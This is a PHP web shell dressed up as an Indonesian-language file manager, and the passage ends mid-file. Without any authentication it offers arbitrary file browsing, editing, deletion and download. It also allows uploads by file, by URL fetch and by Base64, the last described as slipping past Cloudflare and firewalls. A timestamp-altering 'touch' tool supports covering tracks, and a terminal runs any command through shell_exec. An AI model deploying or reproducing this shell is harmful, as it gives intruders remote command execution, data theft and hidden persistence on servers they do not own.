<?php
// ============================================================
// ERROR REPORTING
// ============================================================
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '256M');
ini_set('max_execution_time', 300);

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function safeFilesize($path) {
    $size = @filesize($path);
    return ($size === false) ? 0 : $size;
}

function safeFilemtime($path) {
    $time = @filemtime($path);
    return ($time === false) ? time() : $time;
}

function safeScandir($path) {
    $items = @scandir($path);
    if ($items === false) {
        $items = [];
        if ($handle = @opendir($path)) {
            while (($file = readdir($handle)) !== false) {
                $items[] = $file;
            }
            closedir($handle);
        }
    }
    return $items;
}

function formatSize($bytes) {
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes / 1024, 2) . ' KB';
    if ($bytes < 1073741824) return round($bytes / 1048576, 2) . ' MB';
    return round($bytes / 1073741824, 2) . ' GB';
}

function hapusFolder($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return @unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!hapusFolder($dir . '/' . $item)) return false;
    }
    return @rmdir($dir);
}

function getFileTemplate($type, $filename) {
    $templates = [
        'php' => "<?php\n/**\n * File: " . basename($filename) . "\n * Created: " . date('Y-m-d H:i:s') . "\n */\n\necho 'Hello World!';\n",
        'html' => "<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>" . basename($filename) . "</title>\n</head>\n<body>\n    <h1>Hello World!</h1>\n</body>\n</html>",
        'css' => "/* File: " . basename($filename) . " */\nbody { margin:0; padding:0; }\n",
        'js' => "// File: " . basename($filename) . "\nconsole.log('Hello World!');\n",
        'python' => "#!/usr/bin/env python3\nprint('Hello World!')\n",
        'bash' => "#!/bin/bash\necho 'Hello World!'\n",
        'sql' => "-- File: " . basename($filename) . "\nCREATE TABLE contoh (id INT PRIMARY KEY);\n",
        'json' => "{\n    \"nama\": \"Contoh\"\n}\n",
        'xml' => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<root></root>\n",
        'txt' => "File: " . basename($filename) . "\nCreated: " . date('Y-m-d H:i:s') . "\n",
        'md' => "# " . basename($filename) . "\n\nCreated: " . date('Y-m-d H:i:s') . "\n",
        'empty' => ""
    ];
    return $templates[$type] ?? $templates['empty'];
}

// ============================================================
// AMBIL PATH
// ============================================================
$current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (empty($current_path)) $current_path = getcwd();
$edit_file = isset($_GET['edit']) ? $_GET['edit'] : '';

// ============================================================
// HANDLE DOWNLOAD
// ============================================================
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && !is_dir($file) && is_readable($file)) {
        if (ob_get_level()) ob_end_clean();
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($file)) . '&error=File tidak ditemukan');
        exit;
    }
}

// ============================================================
// HANDLE POST
// ============================================================
$msg_success = '';
$msg_error = '';

if (isset($_POST['base64_upload']) && !empty($_POST['base64_data'])) {
    $upload_path = $_POST['base64_upload_path'] ?? getcwd();
    $filename = isset($_POST['base64_filename']) ? trim($_POST['base64_filename']) : '';
    $file_content = base64_decode($_POST['base64_data']);
    if ($file_content === false || empty($file_content)) {
        $msg_error = "Gagal decode Base64 atau data kosong!";
    } else {
        if (empty($filename)) $filename = 'upload_' . date('Ymd_His') . '.bin';
        $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
        $target = rtrim($upload_path, '/') . '/' . $filename;
        if (file_put_contents($target, $file_content) !== false) {
            @chmod($target, 0644);
            $msg_success = "Base64 upload berhasil: " . htmlspecialchars($filename) . " (" . formatSize(strlen($file_content)) . ")";
        } else {
            $msg_error = "Gagal menyimpan file!";
        }
    }
}

if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
    $upload_path = $_POST['upload_path'] ?? getcwd();
    if ($_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
        $file_name = preg_replace('/[^a-zA-Z0-9._-]/', '_', basename($_FILES['uploaded_file']['name']));
        $target = rtrim($upload_path, '/') . '/' . $file_name;
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            @chmod($target, 0644);
            $msg_success = "Upload berhasil: " . htmlspecialchars($file_name);
        } else {
            $msg_error = "Upload gagal!";
        }
    }
}

if (isset($_POST['url_upload']) && !empty($_POST['url_upload_source'])) {
    $save_path = rtrim($_POST['url_upload_path'] ?? getcwd(), '/') . '/';
    $source_url = trim($_POST['url_upload_source']);
    $custom_name = trim($_POST['url_upload_name'] ?? '');
    if (empty($custom_name)) $custom_name = basename(parse_url($source_url, PHP_URL_PATH)) ?: 'downloaded_file';
    $target_file = $save_path . $custom_name;
    $content = @file_get_contents($source_url);
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $source_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    if ($content !== false && !empty($content)) {
        if (file_put_contents($target_file, $content) !== false) {
            @chmod($target_file, 0644);
            $msg_success = "Download URL berhasil: " . htmlspecialchars($custom_name);
        }
    } else {
        $msg_error = "Gagal download dari URL!";
    }
}

if (isset($_POST['save_edit']) && isset($_POST['edit_file_path']) && isset($_POST['edit_file_content'])) {
    $file_path = $_POST['edit_file_path'];
    if (file_exists($file_path) && is_writable($file_path)) {
        if (file_put_contents($file_path, $_POST['edit_file_content']) !== false) {
            $msg_success = "File disimpan: " . htmlspecialchars(basename($file_path));
        }
    }
}

if (isset($_POST['touch_file']) && isset($_POST['touch_path']) && isset($_POST['touch_time'])) {
    $file_path = $_POST['touch_path'];
    if (file_exists($file_path)) {
        try {
            $dt = new DateTime($_POST['touch_time']);
            if (touch($file_path, $dt->getTimestamp())) {
                $msg_success = "Touch berhasil: " . htmlspecialchars(basename($file_path));
            }
        } catch (Exception $e) {
            $msg_error = "Format tanggal salah!";
        }
    }
}

if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $_POST['old_name'];
    $new_name = basename($_POST['new_name']);
    if (file_exists($old) && !empty($new_name)) {
        $new_dir = dirname($old) . '/' . $new_name;
        if (rename($old, $new_dir)) {
            $msg_success = "Rename berhasil: " . htmlspecialchars($new_name);
        }
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (file_exists($target)) {
        if (is_dir($target)) {
            if (hapusFolder($target)) $msg_success = "Folder dihapus!";
        } else {
            if (@unlink($target)) $msg_success = "File dihapus!";
        }
    }
}

if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $path = rtrim($_POST['create_path'] ?? getcwd(), '/') . '/' . basename($_POST['folder_name']);
    if (mkdir($path, 0755)) {
        $msg_success = "Folder dibuat: " . htmlspecialchars(basename($path));
    }
}

if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $file_path = rtrim($_POST['create_file_path'] ?? getcwd(), '/') . '/' . basename($_POST['file_name']);
    $template = $_POST['file_template'] ?? 'empty';
    $content = getFileTemplate($template, $file_path);
    if (!file_exists($file_path)) {
        if (file_put_contents($file_path, $content) !== false) {
            @chmod($file_path, 0644);
            $msg_success = "File dibuat: " . htmlspecialchars(basename($file_path));
        }
    }
}

$cmd_output = '';
if (isset($_POST['run_command']) && !empty($_POST['command'])) {
    $cmd_path = $_POST['cmd_path'] ?? getcwd();
    if (function_exists('shell_exec')) {
        $cmd_output = shell_exec('cd ' . escapeshellarg($cmd_path) . ' 2>&1 && ' . $_POST['command'] . ' 2>&1');
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengelola Berkas Master</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { box-sizing: border-box; }
        body {
            background: url('https://gcdnb.pbrd.co/images/9MsvMtxPndIa.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        #container {
            padding: 25px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.88);
            width: 97vw;
            min-height: 97vh;
            box-sizing: border-box;
            overflow: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .icon-button {
            font-size: 18px;
            color: white;
            cursor: pointer;
            background-color: darkred;
            border-radius: 50%;
            padding: 10px;
            margin: 3px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: none;
            transition: 0.2s;
            width: 42px;
            height: 42px;
        }
        .icon-button:hover { background-color: #8b0000; transform: scale(1.05); }
        .icon-button.green { background: #2b8a3e; }
        .icon-button.green:hover { background: #3ca050; }
        
        input[type="text"], textarea, input[type="file"], select, input[type="datetime-local"] {
            border: 2px solid darkred;
            background-color: black;
            color: white;
            padding: 8px 12px;
            border-radius: 5px;
            box-sizing: border-box;
            font-family: inherit;
        }
        input[type="text"]:focus, textarea:focus, input[type="datetime-local"]:focus {
            outline: none;
            border-color: #ff4444;
        }
        textarea { resize: vertical; min-height: 100px; }
        
        form {
            margin-bottom: 10px;
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            align-items: center;
            justify-content: center;
            width: 100%;
        }
        
        /* ============================================================
        FILE LIST - TABLE STYLE (RAPI)
        ============================================================ */
        .file-list {
            background-color: #1a1a1a;
            border-radius: 8px;
            width: 100%;
            box-sizing: border-box;
            max-height: 600px;
            overflow: auto;
            margin: 10px 0;
            border: 1px solid #2a2a2a;
        }
        .file-list-header {
            display: grid;
            grid-template-columns: 40px 1fr 120px 170px 380px;
            gap: 8px;
            padding: 10px 15px;
            background: #0a0a0a;
            border-bottom: 1px solid #333;
            font-size: 12px;
            font-weight: bold;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: sticky;
            top: 0;
            z-index: 10;
            border-radius: 8px 8px 0 0;
        }
        .file-row {
            display: grid;
            grid-template-columns: 40px 1fr 120px 170px 380px;
            gap: 8px;
            padding: 8px 15px;
            border-bottom: 1px solid #222;
            align-items: center;
            font-size: 13px;
            transition: background 0.15s;
        }
        .file-row:hover {
            background: rgba(255,255,255,0.03);
        }
        .file-row:last-child { border-bottom: none; }
        .file-icon { font-size: 16px; text-align: center; }
        .file-name {
            font-family: 'Courier New', monospace;
            word-break: break-all;
            color: #e0e0e0;
        }
        .file-name.is-dir { color: #ffd43b; font-weight: 600; }
        .file-size { color: #888; font-size: 12px; text-align: right; }
        .file-time {
            color: #ff922b;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        }
        .file-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .file-actions a {
            font-size: 11px;
            text-decoration: none;
            padding: 2px 6px;
            border-radius: 3px;
            transition: 0.15s;
            font-weight: 500;
        }
        .file-actions a:hover {
            background: rgba(255,255,255,0.1);
            text-decoration: none;
        }
        .link-open { color: #66d9ff; }
        .link-edit { color: #ffd43b; }
        .link-rename { color: #51cf66; }
        .link-delete { color: #ff6b6b; }
        .link-touch { color: #ff922b; }
        .link-download { color: #69db7c; }
        
        /* RENAME & TOUCH FORM */
        .inline-form {
            grid-column: 1 / -1;
            background: #0a0a0a;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 5px 0;
            display: none;
            border: 1px solid #333;
        }
        .inline-form form {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
            justify-content: flex-start;
        }
        .inline-form input[type="text"],
        .inline-form input[type="datetime-local"] {
            padding: 6px 10px;
            font-size: 13px;
            flex: 1;
            min-width: 150px;
            max-width: 400px;
        }
        .inline-form button {
            padding: 6px 14px;
            font-size: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.2s;
        }
        .btn-ok { background: #2b8a3e; color: white; }
        .btn-ok:hover { background: #3ca050; }
        .btn-cancel { background: #666; color: white; }
        .btn-cancel:hover { background: #777; }
        
        /* FILE PREVIEW */
        .file-preview {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 500px;
            overflow: auto;
            border: 1px solid #2a2a2a;
            white-space: pre-wrap;
            word-break: break-word;
            color: #51cf66;
            width: 100%;
        }
        
        /* FORM CONTAINER */
        .form-container {
            display: none;
            width: 100%;
            margin-top: 8px;
            padding: 15px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
            border: 1px solid #2a2a2a;
        }
        .submit-button {
            background-color: darkred;
            border: none;
            color: white;
            padding: 8px 18px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            transition: 0.2s;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }
        .submit-button:hover { background-color: #8b0000; transform: scale(1.02); }
        .submit-button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .avatar {
            display: block;
            margin: 0 auto 15px;
            width: 90px;
            height: 90px;
            border-radius: 50%;
            border: 2px solid #8b0000;
            object-fit: cover;
            filter: grayscale(30%) contrast(120%);
            box-shadow: 0 0 20px rgba(139, 0, 0, 0.5);
        }
        .avatar:hover {
            filter: grayscale(0%) contrast(130%);
            box-shadow: 0 0 30px rgba(139, 0, 0, 0.8);
            transform: scale(1.05);
            transition: 0.3s;
        }
        .breadcrumb {
            width: 100%;
            padding: 10px 15px;
            margin-bottom: 8px;
            background: rgba(0,0,0,0.4);
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 13px;
            border: 1px solid #2a2a2a;
            word-break: break-all;
        }
        .breadcrumb a { color: #ffaa00; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb .current { color: #66d9ff; font-weight: 600; }
        
        .status-badge {
            font-size: 10px;
            padding: 2px 10px;
            border-radius: 10px;
            margin-left: 5px;
            display: inline-block;
        }
        .status-badge.on { background: #2b8a3e; color: white; }
        .status-badge.off { background: #c92a2a; color: white; }
        
        .path-input { width: 100% !important; margin-bottom: 3px; }
        .flex-wrap {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            justify-content: center;
            margin: 5px 0;
        }
        
        .editor-area {
            width: 100%;
            min-height: 300px;
            background: #0a0a0a;
            color: #51cf66;
            border: 1px solid #333;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            border-radius: 5px;
            resize: vertical;
            line-height: 1.6;
        }
        .editor-area:focus { border-color: #51cf66; outline: none; }
        
        .file-info-bar {
            color: #ffaa00;
            font-size: 13px;
            margin-bottom: 10px;
            padding: 10px 15px;
            background: rgba(0,0,0,0.4);
            border-radius: 5px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        .file-info-bar .close-btn { color: #ff6b6b; text-decoration: none; margin-left: auto; font-size: 16px; }
        
        .warning-box {
            background: #c92a2a22;
            padding: 10px 15px;
            border: 1px solid #c92a2a;
            border-radius: 5px;
            margin-bottom: 10px;
            color: #ff6b6b;
            font-size: 13px;
        }
        .footer-info {
            color: #555;
            font-size: 10px;
            margin-top: 15px;
            text-align: center;
        }
        .msg-box {
            width: 100%;
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 12px;
            font-size: 13px;
            box-sizing: border-box;
            font-weight: 500;
        }
        .msg-box.success { background: #2b8a3e33; border: 1px solid #2b8a3e; color: #51cf66; }
        .msg-box.error { background: #c92a2a33; border: 1px solid #c92a2a; color: #ff6b6b; }
        
        /* BASE64 PROGRESS */
        .base64-progress {
            width: 100%;
            height: 6px;
            background: #1a1a1a;
            border-radius: 3px;
            overflow: hidden;
            margin: 8px 0;
            display: none;
        }
        .base64-progress .bar {
            height: 100%;
            background: linear-gradient(90deg, #2b8a3e, #51cf66);
            width: 0%;
            transition: width 0.3s;
        }
        .base64-status { color: #888; font-size: 11px; margin-top: 3px; }
        
        /* EMPTY STATE */
        .empty-state {
            padding: 40px 20px;
            text-align: center;
            color: #666;
            font-size: 14px;
        }
        
        @media (max-width: 900px) {
            .file-list-header, .file-row {
                grid-template-columns: 35px 1fr 100px 140px;
            }
            .file-actions { grid-column: 1 / -1; }
            .file-list-header > :nth-child(4),
            .file-row > :nth-child(4) {
                display: none;
            }
        }
        @media (max-width: 600px) {
            #container { padding: 15px; }
            .file-list-header, .file-row {
                grid-template-columns: 30px 1fr;
                gap: 5px;
                font-size: 12px;
            }
            .file-list-header > :nth-child(3),
            .file-list-header > :nth-child(4),
            .file-row > :nth-child(3),
            .file-row > :nth-child(4) {
                display: none;
            }
            .file-actions {
                grid-column: 1 / -1;
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
<div id="container">
    <img src="https://media.tenor.com/TcwzV1IM0EcAAAAi/zero-two-ok.gif" alt="was here!" class="avatar">
    <h3 style="margin:0 0 8px 0;color:#fff;">Pengelola Berkas</h3>
    
    <?php if ($msg_success): ?>
        <div class="msg-box success">✅ <?php echo htmlspecialchars($msg_success); ?></div>
    <?php endif; ?>
    <?php if ($msg_error): ?>
        <div class="msg-box error">❌ <?php echo htmlspecialchars($msg_error); ?></div>
    <?php endif; ?>
    
    <!-- FORM PATH -->
    <form method="GET" action="" style="width:100%;">
        <input type="text" name="path" value="<?php echo htmlspecialchars($current_path); ?>" class="path-input" />
        <button type="submit" class="submit-button"><i class="fas fa-search"></i> Buka</button>
    </form>
    
    <!-- BREADCRUMB -->
    <div class="breadcrumb">
        <i class="fas fa-folder-open" style="color:#ffaa00;"></i>
        <?php
        $parts = explode('/', str_replace('\\', '/', $current_path));
        $build = '';
        echo '<a href="?path="><i class="fas fa-home"></i></a>';
        foreach ($parts as $i => $p) {
            if (empty($p)) continue;
            $build .= '/' . $p;
            if ($i < count($parts) - 1) {
                echo ' / <a href="?path=' . urlencode($build) . '">' . htmlspecialchars($p) . '</a>';
            } else {
                echo ' / <span class="current">' . htmlspecialchars($p) . '</span>';
            }
        }
        ?>
    </div>
    
    <!-- TOMBOL AKSI -->
    <div class="flex-wrap">
        <button class="icon-button" onclick="toggleForm('upload-form')" title="Upload File"><i class="fas fa-upload"></i></button>
        <button class="icon-button green" onclick="toggleForm('base64-form')" title="Upload Base64"><i class="fas fa-code"></i></button>
        <button class="icon-button" onclick="toggleForm('url-upload-form')" title="Upload from URL" style="background:#8b0000;"><i class="fas fa-cloud-download-alt"></i></button>
        <button class="icon-button" onclick="toggleForm('create-folder-form')" title="Buat Folder"><i class="fas fa-folder-plus"></i></button>
        <button class="icon-button" onclick="toggleForm('create-file-form-container')" title="Buat File" style="background:#8b0000;"><i class="fas fa-file"></i></button>
        <button class="icon-button" onclick="toggleForm('run-command-form')" title="Terminal"><i class="fas fa-terminal"></i></button>
        <button class="icon-button green" onclick="toggleForm('edit-form')" title="Edit File"><i class="fas fa-edit"></i></button>
        <button class="icon-button green" onclick="location.reload()" title="Refresh"><i class="fas fa-sync"></i></button>
    </div>
    
    <!-- FORM UPLOAD -->
    <div id="upload-form" class="form-container">
        <form method="POST" action="" enctype="multipart/form-data">
            <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="file" name="uploaded_file" style="flex:1;min-width:200px;" />
            <button type="submit" name="upload" class="submit-button"><i class="fas fa-upload"></i> Upload</button>
        </form>
    </div>
    
    <!-- FORM BASE64 -->
    <div id="base64-form" class="form-container">
        <div style="color:#ffd43b;margin-bottom:10px;font-size:13px;">
            <i class="fas fa-shield-alt"></i> <b>Upload via Base64</b> - Lolos Cloudflare/Firewall
        </div>
        <form method="POST" action="" id="base64UploadForm">
            <input type="hidden" name="base64_upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="hidden" name="base64_data" id="base64Data" />
            <input type="hidden" name="base64_upload" value="1" />
            <input type="file" id="base64FileInput" style="flex:1;min-width:200px;" />
            <input type="text" name="base64_filename" id="base64Filename" placeholder="Nama file (opsional)" style="flex:1;min-width:150px;" />
            <button type="button" onclick="convertAndUploadBase64()" class="submit-button" style="background:#2b8a3e;">
                <i class="fas fa-code"></i> Upload
            </button>
        </form>
        <div class="base64-progress" id="base64Progress"><div class="bar" id="base64ProgressBar"></div></div>
        <div class="base64-status" id="base64Status">Pilih file untuk diupload via Base64</div>
    </div>
    
    <!-- FORM URL -->
    <div id="url-upload-form" class="form-container">
        <form method="POST" action="">
            <input type="hidden" name="url_upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="text" name="url_upload_source" placeholder="URL file" required style="flex:2;min-width:200px;" />
            <input type="text" name="url_upload_name" placeholder="Simpan sebagai" style="flex:1;min-width:150px;" />
            <button type="submit" name="url_upload" class="submit-button"><i class="fas fa-cloud-download-alt"></i> Download</button>
        </form>
    </div>
    
    <!-- FORM FOLDER -->
    <div id="create-folder-form" class="form-container">
        <form method="POST" action="">
            <input type="hidden" name="create_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="text" name="folder_name" placeholder="Nama Folder" style="flex:1;min-width:200px;" />
            <button type="submit" name="create_folder" class="submit-button"><i class="fas fa-folder-plus"></i> Buat</button>
        </form>
    </div>
    
    <!-- FORM BUAT FILE -->
    <div id="create-file-form-container" class="form-container">
        <form method="POST" action="">
            <input type="hidden" name="create_file_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="text" name="file_name" placeholder="Nama File" required style="flex:1;min-width:150px;" />
            <select name="file_template">
                <option value="empty">📄 Kosong</option>
                <option value="php">🐘 PHP</option>
                <option value="html">🌐 HTML</option>
                <option value="css">🎨 CSS</option>
                <option value="js">⚡ JavaScript</option>
                <option value="txt">📝 Text</option>
                <option value="md">📖 Markdown</option>
            </select>
            <button type="submit" name="create_file" class="submit-button"><i class="fas fa-file"></i> Buat</button>
        </form>
    </div>
    
    <!-- FORM TERMINAL -->
    <div id="run-command-form" class="form-container">
        <form method="POST" action="">
            <input type="hidden" name="cmd_path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="text" name="command" placeholder="Perintah (contoh: ls -la)" style="flex:1;min-width:200px;" />
            <button type="submit" name="run_command" class="submit-button"><i class="fas fa-terminal"></i> Jalankan</button>
            <?php
            if (function_exists('shell_exec')) {
                $test = @shell_exec('echo ok');
                echo (trim($test) == 'ok') ? '<span class="status-badge on">Aktif</span>' : '<span class="status-badge off">Terbatas</span>';
            } else {
                echo '<span class="status-badge off">Disabled</span>';
            }
            ?>
        </form>
        <?php if (!empty($cmd_output)): ?>
        <pre style="background:#0a0a0a;padding:12px;border-radius:5px;border:1px solid #2a2a2a;margin-top:10px;font-size:12px;color:#51cf66;max-height:400px;overflow:auto;"><?php echo htmlspecialchars($cmd_output); ?></pre>
        <?php endif; ?>
    </div>
    
    <!-- FORM EDIT -->
    <div id="edit-form" class="form-container">
        <?php
        if (!empty($edit_file) && file_exists($edit_file) && !is_dir($edit_file)) {
            $file_content = @file_get_contents($edit_file);
            $is_writable = is_writable($edit_file);
        ?>
        <div style="background:#0a0a0a;padding:15px;border-radius:8px;border:1px solid #333;width:100%;">
            <div class="file-info-bar">
                <i class="fas fa-edit"></i> <b><?php echo htmlspecialchars(basename($edit_file)); ?></b>
                <span><?php echo formatSize(safeFilesize($edit_file)); ?></span>
                <?php if ($is_writable): ?>
                    <span style="color:#51cf66;">✅ Writable</span>
                <?php else: ?>
                    <span style="color:#ff6b6b;">❌ Read-only</span>
                <?php endif; ?>
                <a href="?path=<?php echo urlencode(dirname($edit_file)); ?>" class="close-btn"><i class="fas fa-times"></i></a>
            </div>
            <form method="POST" action="" style="display:block;width:100%;">
                <input type="hidden" name="edit_file_path" value="<?php echo htmlspecialchars($edit_file); ?>" />
                <textarea name="edit_file_content" class="editor-area" <?php echo !$is_writable ? 'readonly style="opacity:0.6;"' : ''; ?>><?php echo htmlspecialchars($file_content); ?></textarea>
                <div style="display:flex;gap:5px;margin-top:10px;flex-wrap:wrap;justify-content:flex-start;">
                    <button type="submit" name="save_edit" class="submit-button" style="background:#2b8a3e;" <?php echo !$is_writable ? 'disabled' : ''; ?>>
                        <i class="fas fa-save"></i> Simpan
                    </button>
                    <a href="?path=<?php echo urlencode(dirname($edit_file)); ?>" class="submit-button" style="background:#c92a2a;">
                        <i class="fas fa-times"></i> Tutup
                    </a>
                </div>
            </form>
        </div>
        <?php } else { ?>
        <form method="GET" action="">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($current_path); ?>" />
            <input type="text" name="edit" placeholder="Path file" style="flex:1;min-width:200px;" />
            <button type="submit" class="submit-button"><i class="fas fa-folder-open"></i> Buka</button>
        </form>
        <?php } ?>
    </div>
    
    <!-- ============================================================
    FILE LIST - RAPI & TERSTRUKTUR
    ============================================================ -->
    <div class="file-list">
        <div class="file-list-header">
            <div></div>
            <div>Nama</div>
            <div>Size</div>
            <div>Modified</div>
            <div>Actions</div>
        </div>
        
        <?php
        if (is_dir($current_path)) {
            $items = safeScandir($current_path);
            
            if (empty($items)) {
                echo '<div class="empty-state">📂 Direktori kosong atau tidak bisa dibaca</div>';
            } else {
                $dirs = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full = rtrim($current_path, '/') . '/' . $item;
                    if (is_dir($full)) $dirs[] = $item;
                    else $files[] = $item;
                }
                sort($dirs);
                sort($files);
                $all = array_merge($dirs, $files);
                
                if (empty($all)) {
                    echo '<div class="empty-state">📂 Direktori kosong</div>';
                } else {
                    foreach ($all as $item) {
                        $full = rtrim($current_path, '/') . '/' . $item;
                        $isDir = is_dir($full);
                        $icon = $isDir ? '📁' : '📄';
                        $size = $isDir ? '—' : formatSize(safeFilesize($full));
                        $mtime = safeFilemtime($full);
                        $mtime_str = date('Y-m-d H:i', $mtime);
                        $hash = md5($full);
                        
                        echo '<div class="file-row">';
                        echo '<div class="file-icon">' . $icon . '</div>';
                        echo '<div class="file-name ' . ($isDir ? 'is-dir' : '') . '">' . htmlspecialchars($item) . '</div>';
                        echo '<div class="file-size">' . $size . '</div>';
                        echo '<div class="file-time">' . $mtime_str . '</div>';
                        echo '<div class="file-actions">';
                        
                        echo '<a href="?path=' . urlencode($full) . '" class="link-open">📂 buka</a>';
                        if (!$isDir) {
                            echo '<a href="?path=' . urlencode($current_path) . '&edit=' . urlencode($full) . '" class="link-edit">✏️ edit</a>';
                        }
                        echo '<a href="javascript:void(0)" class="link-rename" onclick="showRename(\'' . addslashes(htmlspecialchars($full)) . '\', \'' . $hash . '\')">🔤 rename</a>';
                        echo '<a href="?delete=' . urlencode($full) . '&path=' . urlencode($current_path) . '" class="link-delete" onclick="return confirm(\'Hapus ' . addslashes(htmlspecialchars($item)) . '?\')">🗑️ hapus</a>';
                        echo '<a href="javascript:void(0)" class="link-touch" onclick="showTouch(\'' . addslashes(htmlspecialchars($full)) . '\', \'' . $hash . '\', \'' . $mtime . '\')">🕐 touch</a>';
                        if (!$isDir) {
                            echo '<a href="?download=' . urlencode($full) . '" class="link-download">⬇️ download</a>';
                        }
                        echo '</div>';
                        echo '</div>';
                        
                        // Rename form (inline, muncul saat klik rename)
                        echo '<div id="rename-form-' . $hash . '" class="inline-form">';
                        echo '<form method="POST" action="">';
                        echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($full, ENT_QUOTES) . '" />';
                        echo '<input type="text" name="new_name" value="' . htmlspecialchars($item, ENT_QUOTES) . '" />';
                        echo '<button type="submit" name="rename" class="btn-ok">Rename</button>';
                        echo '<button type="button" onclick="hideRename(\'' . $hash . '\')" class="btn-cancel">Batal</button>';
                        echo '</form>';
                        echo '</div>';
                        
                        // Touch form (inline)
                        echo '<div id="touch-form-' . $hash . '" class="inline-form">';
                        echo '<form method="POST" action="">';
                        echo '<input type="hidden" name="touch_path" value="' . htmlspecialchars($full, ENT_QUOTES) . '" />';
                        echo '<input type="datetime-local" name="touch_time" value="' . date('Y-m-d\TH:i', $mtime) . '" />';
                        echo '<button type="submit" name="touch_file" class="btn-ok">Ubah Waktu</button>';
                        echo '<button type="button" onclick="hideTouch(\'' . $hash . '\')" class="btn-cancel">Batal</button>';
                        echo '</form>';
                        echo '</div>';
                    }
                }
            }
        } elseif (file_exists($current_path)) {
            // Single file preview
            echo '<div style="padding:15px;grid-column:1/-1;">';
            echo '<div style="color:#51cf66;font-size:15px;margin-bottom:10px;">📄 ' . htmlspecialchars(basename($current_path)) . '</div>';
            
            $ext = strtolower(pathinfo($current_path, PATHINFO_EXTENSION));
            $images = ['jpg','jpeg','png','gif','webp','bmp','svg','ico'];
            
            if (in_array($ext, $images)) {
                echo "<img src='" . htmlspecialchars($current_path) . "' style='max-width:100%;max-height:500px;border-radius:5px;' />";
            } else {
                $content = @file_get_contents($current_path);
                if ($content !== false && mb_detect_encoding($content, null, true)) {
                    echo '<div class="file-preview">' . htmlspecialchars($content) . '</div>';
                } else {
                    echo '<div style="color:#ff6b6b;">📊 Binary file - ' . formatSize(safeFilesize($current_path)) . '</div>';
                }
            }
            
